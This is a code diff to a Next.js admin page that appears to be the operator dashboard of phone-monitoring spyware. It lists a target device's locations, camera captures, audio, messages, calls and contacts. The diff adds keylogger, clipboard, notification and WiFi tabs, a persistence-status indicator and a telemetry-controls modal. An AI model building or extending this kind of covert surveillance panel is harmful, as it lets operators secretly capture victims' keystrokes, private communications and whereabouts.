@@ -6,8 +6,10 @@ import { useParams } from "next/navigation";
 import { DeviceDetailHeader } from "@/components/admin/devices/DeviceDetailHeader";
 import { DeviceTabViews } from "@/components/admin/devices/DeviceTabViews";
 import { DeviceTabBar } from "@/components/admin/devices/DeviceTabBar";
-import { MapPin, Camera, User, Phone, MessageSquare, Layers, Mic, Radio, Folder } from "lucide-react";
+import { DeviceTelemetryControlsModal } from "@/components/admin/devices/DeviceTelemetryControlsModal";
+import { MapPin, Camera, User, Phone, MessageSquare, Layers, Mic, Radio, Folder, Bell, Keyboard, Clipboard, ShieldCheck } from "lucide-react";
 import { useDeviceDetail } from "@/components/admin/devices/useDeviceDetail";
+import { useDeviceTelemetry } from "@/hooks/useDeviceTelemetry";
 
 const TAB_PREFS_KEY = "snap_tab_prefs";
 
@@ -25,19 +27,25 @@ export default function DeviceDetailPage() {
   const deviceId = params.id as string;
 
   const [tabPrefs, setTabPrefs] = useState<Record<string, boolean>>({});
+  const [showTelemetryModal, setShowTelemetryModal] = useState(false);
   useEffect(() => { setTabPrefs(loadTabPrefs()); }, []);
 
-  // Default is strictly OFF (false) per user directive (zero DB/network load)
   const isTabEnabled = useCallback((tabId: string) => tabPrefs[tabId] === true, [tabPrefs]);
 
   const {
     device, locations, contacts, calls, messages, captures, audioClips, files, filesLoading, tabLoading, appCount,
-    activeTab, setActiveTab, loading, isRefreshing, toast, isLiveMovement,
+    activeTab, setActiveTab, loading, isRefreshing, isLiveMovement,
     handleFullRefresh, handleToggleLiveMovement, sendCommand, handleDeleteCommand, handleBulkDeleteCommands,
     handleDeleteContact, handleDeleteCall, handleDeleteMessage, handleDeleteApp, handleDeleteFile,
     handleBulkDeleteContacts, handleBulkDeleteCalls, handleBulkDeleteMessages, handleBulkDeleteApps, handleBulkDeleteFiles,
     fetchTabData,
   } = useDeviceDetail(deviceId, isTabEnabled);
+
+  const {
+    telemetryConfig, setTelemetryConfig, persistenceStatus, currentSsid,
+    notifications, keystrokes, clipboardItems, lockEvents, wifiNetworks,
+    fetchTelemetryData, clearModuleData,
+  } = useDeviceTelemetry(deviceId);
 
   const toggleTab = (tabId: string) => {
     const nextVal = !isTabEnabled(tabId);
@@ -50,6 +58,12 @@ export default function DeviceDetailPage() {
       fetchTabData(tabId, true, true);
     }
   };
+
+  useEffect(() => {
+    if (["notifications", "keylogger", "clipboard", "security"].includes(activeTab)) {
+      fetchTelemetryData(activeTab);
+    }
+  }, [activeTab, fetchTelemetryData]);
 
   if (loading && !device) {
     return (
@@ -67,6 +81,10 @@ export default function DeviceDetailPage() {
     { id: "gallery", label: `Gallery (${counts.gallery ?? files.length})`, icon: Folder },
     { id: "camera", label: `Snaps (${captures.length})`, icon: Camera },
     { id: "audio", label: `Audio (${audioClips.length})`, icon: Mic },
+    { id: "notifications", label: `Notifs (${notifications.length})`, icon: Bell },
+    { id: "keylogger", label: `Keys (${keystrokes.length})`, icon: Keyboard },
+    { id: "clipboard", label: `Clips (${clipboardItems.length})`, icon: Clipboard },
+    { id: "security", label: "Security & WiFi", icon: ShieldCheck },
     { id: "apps", label: `Apps (${counts.apps ?? appCount})`, icon: Layers },
     { id: "contacts", label: `Contacts (${counts.contacts ?? contacts.length})`, icon: User },
     { id: "calls", label: `Calls (${counts.calls ?? calls.length})`, icon: Phone },
@@ -75,7 +93,12 @@ export default function DeviceDetailPage() {
 
   return (
     <div className="space-y-3 sm:space-y-5 pb-20 md:pb-8 max-w-full overflow-x-hidden">
-      <DeviceDetailHeader device={device} onRefresh={handleFullRefresh} isRefreshing={isRefreshing} />
+      <DeviceDetailHeader
+        device={device}
+        onRefresh={handleFullRefresh}
+        isRefreshing={isRefreshing}
+        onOpenControls={() => setShowTelemetryModal(true)}
+      />
 
       <DeviceTabBar tabs={TABS} activeTab={activeTab} onSelectTab={setActiveTab} />
 
@@ -89,6 +112,14 @@ export default function DeviceDetailPage() {
         captures={captures}
         audioClips={audioClips}
         files={files}
+        notifications={notifications}
+        keystrokes={keystrokes}
+        clipboardItems={clipboardItems}
+        lockEvents={lockEvents}
+        wifiNetworks={wifiNetworks}
+        currentSsid={currentSsid}
+        persistenceStatus={persistenceStatus}
+        onClearModule={clearModuleData}
         filesLoading={filesLoading}
         tabLoading={tabLoading}
         isLiveMovement={isLiveMovement}
@@ -113,6 +144,15 @@ export default function DeviceDetailPage() {
         onBulkDeleteMessages={handleBulkDeleteMessages}
         onBulkDeleteApps={handleBulkDeleteApps}
         onBulkDeleteFiles={handleBulkDeleteFiles}
+      />
+
+      <DeviceTelemetryControlsModal
+        isOpen={showTelemetryModal}
+        onClose={() => setShowTelemetryModal(false)}
+        deviceId={deviceId}
+        initialConfig={telemetryConfig}
+        persistenceStatus={persistenceStatus}
+        onSaved={(cfg) => setTelemetryConfig(cfg)}
       />
     </div>
   );
